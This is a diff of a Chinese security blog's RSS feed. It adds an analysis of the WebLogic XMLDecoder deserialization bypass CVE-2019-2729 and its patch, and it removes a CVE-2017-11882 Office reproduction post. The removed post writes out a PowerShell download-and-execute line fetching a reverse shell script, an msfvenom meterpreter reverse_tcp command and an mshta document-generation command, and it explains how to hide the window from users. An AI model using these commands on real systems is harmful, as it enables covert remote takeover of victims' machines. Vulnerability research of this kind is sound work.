@@ -10,6 +10,81 @@
     <atom:link href="https://kylingit.com/tags/vul/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
+      <title>CVE-2019-2729 Weblogic XMLDecoder反序列化漏洞分析</title>
+      <link>https://kylingit.com/blog/cve-2019-2729-weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+      <pubDate>Wed, 19 Jun 2019 12:26:39 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/cve-2019-2729-weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+      <description>
+
+&lt;h3 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h3&gt;
+
+&lt;p&gt;该漏洞是&lt;code&gt;CVE-2019-2725&lt;/code&gt;的绕过，因此前面的流程都是一样的，经过21个&lt;code&gt;handler&lt;/code&gt;处理，最终进入&lt;code&gt;WorkAreaHeader&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620123830.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在4月份&lt;code&gt;oracle&lt;/code&gt;对2725紧急补丁中，过滤了&lt;code&gt;class&lt;/code&gt;元素，因此不能再通过&lt;code&gt;class&lt;/code&gt;创建对象&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620123907.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这次的绕过实际上就是找到另外的元素代替&lt;code&gt;class&lt;/code&gt;进而绕过补丁。&lt;/p&gt;
+
+&lt;p&gt;在&lt;code&gt;jdk7&lt;/code&gt;中解析&lt;code&gt;xml&lt;/code&gt;时获取&lt;code&gt;element&lt;/code&gt;元素的相关类为&lt;code&gt;com.sun.beans.decoder.DocumentHandler&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;当传入&lt;code&gt;array&lt;/code&gt;标签，进入&lt;code&gt;ArrayElementHandler&lt;/code&gt;，为&lt;code&gt;array&lt;/code&gt;元素添加属性时，只能从&lt;code&gt;length&lt;/code&gt;，&lt;code&gt;class&lt;/code&gt;，&lt;code&gt;id&lt;/code&gt;中选择，唯一能创建类的&lt;code&gt;class&lt;/code&gt;已经加入了黑名单，所以在&lt;code&gt;jdk1.7&lt;/code&gt;下不受此漏洞影响，这次的绕过出现在低于&lt;code&gt;jdk1.7&lt;/code&gt;的&lt;code&gt;java&lt;/code&gt;版本上。&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;weblogic 10.3.6.0&lt;/code&gt;自带的&lt;code&gt;jdk&lt;/code&gt;版本为1.6，&lt;code&gt;jdk1.6&lt;/code&gt;中解析xml时有很大的不同，相关处理方法在&lt;code&gt;com.sun.beans.ObjectHandler&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;解析时首先进入的是&lt;code&gt;startElement&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;p&gt;该方法首先获取元素的属性并创建一个&lt;code&gt;hashmap&lt;/code&gt;，当元素含有属性时，会根据属性值进行类/属性/方法的相关操作，当元素没有属性时，调用的是&lt;code&gt;new&lt;/code&gt;方法，例如解析&lt;code&gt;&amp;lt;java&amp;gt;&lt;/code&gt;、&lt;code&gt;&amp;lt;void&amp;gt;&lt;/code&gt;时。而此时如果传入了&lt;code&gt;method&lt;/code&gt;值就会把方法名设置为该值。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620123922.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;随后把方法名设置为我们传入的值，最终通过&lt;code&gt;forName&lt;/code&gt;找到指定的类&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620123941.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620123956.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;之后的流程就和2725一样的了&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/20190620124052.png&#34; alt=&#34;1560635046339&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;进入&lt;code&gt;WorkContextXmlInputAdapter:readUTF()&lt;/code&gt;后的调用栈&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620124309.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;补丁分析&#34;&gt;补丁分析&lt;/h3&gt;
+
+&lt;p&gt;6月19日，&lt;code&gt;Oralce&lt;/code&gt;官方放出了该漏洞的补丁，详情见&lt;a href=&#34;https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2729-5570780.html&#34;&gt;这里&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;分析一下补丁&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;this.validate(new ByteArrayInputStream(baos.toByteArray()));
+this.validateFormat(new ByteArrayInputStream(baos.toByteArray()));
+this.xmlDecoder = new XMLDecoder(new ByteArrayInputStream(baos.toByteArray()));
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在原来&lt;code&gt;validate&lt;/code&gt;过滤的基础上又增加了一次&lt;code&gt;validateFormat&lt;/code&gt;过滤，过滤方法如下&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620124924.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这回终于是采用了白名单方式，&lt;code&gt;allowedName&lt;/code&gt;如下&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190620124935.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;可以看到&lt;code&gt;allowedName&lt;/code&gt;严格限制了可以使用的标签，并且也限制了标签可以拥有的属性，值得注意的是&lt;code&gt;allowedName&lt;/code&gt;不再允许&lt;code&gt;field&lt;/code&gt;标签了，emmm&amp;hellip;&lt;/p&gt;
+
+&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
+
+&lt;p&gt;这个漏洞是当时应急时简单分析的，后续有时间会详细整理一下。&lt;/p&gt;
+
+&lt;p&gt;从整个&lt;code&gt;XMLDecoder&lt;/code&gt;反序列化漏洞的来看（CVE-2017-3506 -&amp;gt; CVE-2017-10271(10352) -&amp;gt; CVE-2019-2725 -&amp;gt; CVE-2019-2729），使用黑名单修补漏洞是不靠谱的，永远不知道下一次绕过是在什么时候，而这次的白名单修复方式会不会还存在缺陷呢？此处还得打一个问号。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
       <title>SA-CORE-2019-004 Drupal内核从XSS到RCE漏洞分析</title>
       <link>https://kylingit.com/blog/sa-core-2019-004-drupal%E5%86%85%E6%A0%B8%E4%BB%8Exss%E5%88%B0rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
       <pubDate>Mon, 22 Apr 2019 15:19:04 +0000</pubDate>
@@ -3067,95 +3142,6 @@ rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/server
 &lt;p&gt;附
 Github上&lt;a href=&#34;https://github.com/3xp10it/exploit/blob/cbc8d61859b9c4c312bb52225671831b895fdbc3/exps/weblogic/weblogic.py&#34;&gt;3xp10it/exploit&lt;/a&gt;仓库删除的脚本
 &lt;a href=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/others/weblogic.py&#34;&gt;Weblogic.py&lt;/a&gt;&lt;/p&gt;
-
-&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>CVE-2017-11882 复现</title>
-      <link>https://kylingit.com/blog/cve-2017-11882-%E5%A4%8D%E7%8E%B0/</link>
-      <pubDate>Tue, 21 Nov 2017 18:40:29 +0000</pubDate>
-      
-      <guid>https://kylingit.com/blog/cve-2017-11882-%E5%A4%8D%E7%8E%B0/</guid>
-      <description>
-
-&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
-
-&lt;p&gt;上周微软更新日，修复了&lt;code&gt;CVE-2017-11882&lt;/code&gt;这个漏洞，根据官方描述该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本，攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。漏洞位置是出现在一个公式编辑器上，叫做&lt;code&gt;EQNEDT32.EXE&lt;/code&gt;，在win10上的路径是&lt;code&gt;C:\Program Files\Common Files\microsoft shared\EQUATION\EQNEDT32.EXE&lt;/code&gt;，可以在编辑文档的时候插入公式。&lt;/p&gt;
-
-&lt;p&gt;最近有利用脚本出来了，也是自己尝试复现了几次，在此简单记录一下&lt;/p&gt;
-
-&lt;p&gt;下载&lt;code&gt;https://github.com/Ridter/CVE-2017-11882/&lt;/code&gt;利用脚本，该脚本是&lt;a href=&#34;https://evi1cg.me/archives/CVE_2017_11882_exp.html&#34;&gt;@Evi1cg&lt;/a&gt;改造后的脚本，经过测试效果还是不错的&lt;/p&gt;
-
-&lt;p&gt;生成一个测试文档的话执行
-&lt;code&gt;python Command_CVE-2017-11882.py -c &amp;quot;cmd.exe /c calc.exe&amp;quot; -o test.doc
-&lt;/code&gt;
-打开test.doc就会弹出计算器，而且全程没有提示或警告之类的弹窗，可以算是完美利用，比之前&lt;a href=&#34;https://kylingit.com/blog/msword-code-exec-without-macro/&#34;&gt;不带宏的代码执行&lt;/a&gt;要简单粗暴&lt;/p&gt;
-
-&lt;p&gt;注意一点的是命令部分长度不能超过43bytes&lt;/p&gt;
-
-&lt;h4 id=&#34;反弹shell&#34;&gt;反弹shell&lt;/h4&gt;
-
-&lt;p&gt;下面主要讲一下反弹shell的利用&lt;/p&gt;
-
-&lt;p&gt;用mshta方式执行代码：
-在vps上建立一个文件&lt;code&gt;test&lt;/code&gt;，内容为&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;&amp;lt;HTML&amp;gt; 
-&amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot;&amp;gt;
-&amp;lt;HEAD&amp;gt; 
-&amp;lt;script language=&amp;quot;VBScript&amp;quot;&amp;gt;
-Set objShell = CreateObject(&amp;quot;Wscript.Shell&amp;quot;)
-objShell.Run &amp;quot;calc.exe&amp;quot;
-self.close
-&amp;lt;/script&amp;gt;
-&amp;lt;body&amp;gt;
-demo
-&amp;lt;/body&amp;gt;
-&amp;lt;/HEAD&amp;gt; 
-&amp;lt;/HTML&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;关键是修改&lt;code&gt;objShell.Run&lt;/code&gt;后面的部分&lt;/p&gt;
-
-&lt;p&gt;我们通过调用powershell下载一个反弹脚本然后执行的方式来获得shell：&lt;/p&gt;
-
-&lt;p&gt;修改&lt;code&gt;objShell.Run&lt;/code&gt;为&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;objShell.Run powershell.exe -WindowStyle Hidden -NoP -sta -NonI -c IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://ip/reverse.ps1&#39;);reverse.ps1&amp;quot;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;其中&lt;code&gt;reverse.ps1&lt;/code&gt;通过&lt;code&gt;msfvenom&lt;/code&gt;生成:&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f psh-reflection &amp;gt;reverse.ps1&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;msf开启监听，然后生成word文档：
-&lt;code&gt;python Command_CVE-2017-11882.py -c &amp;quot;mshta http://ip/test&amp;quot; -o test.doc&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;打开之后就会收到shell&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/5TU1y&#34; alt=&#34;test&#34; /&gt;
-&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/KM1My&#34; alt=&#34;session 1&#34; /&gt;
-但是这样会有一个问题，打开word文档的时候会发现有一个黑框一闪而过，而我们已经指定powershell以&lt;code&gt;-WindowStyle Hidden&lt;/code&gt;的方式运行了，那怎么绕过这个黑框呢？&lt;/p&gt;
-
-&lt;p&gt;查一下&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/d5fk67ky(en-us,VS.85).aspx&#34;&gt;文档&lt;/a&gt;
-可以看到&lt;code&gt;Run&lt;/code&gt;命令是可以通过&lt;code&gt;intWindowStyle&lt;/code&gt;参数来控制窗口风格的，有0-10这几种风格
-&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/q0F4b&#34; alt=&#34;Run Method&#34; /&gt;
-所以我们在执行的命令后面加一个参数，用来控制mshta运行的窗口大小，使之最好隐藏窗口运行
-&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/ccxgV&#34; alt=&#34;0&#34; /&gt;
-经过测试0和2参数都是可以的，达到隐藏窗口执行，用户察觉不了，其它参数可以自己试一下&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/qJKq7&#34; alt=&#34;session 3&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;目前这样生成的文档在火绒和360杀毒的最新版上是没有报毒，但是各大杀软已经更新了规则，凡是远程调用执行cmd或者ps或者regsvr32等都会触发报警，暂时没有好的方法绕过，毕竟是监控着底层的那几个文件的。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/fzUuw&#34; alt=&#34;av&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;参考：&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://evi1cg.me/archives/CVE_2017_11882_exp.html&#34;&gt;https://evi1cg.me/archives/CVE_2017_11882_exp.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://www.freebuf.com/vuls/154462.html&#34;&gt;http://www.freebuf.com/vuls/154462.html&lt;/a&gt;&lt;/p&gt;
 
 &lt;script&gt;pangu.spacingPage();&lt;/script&gt;
 </description>
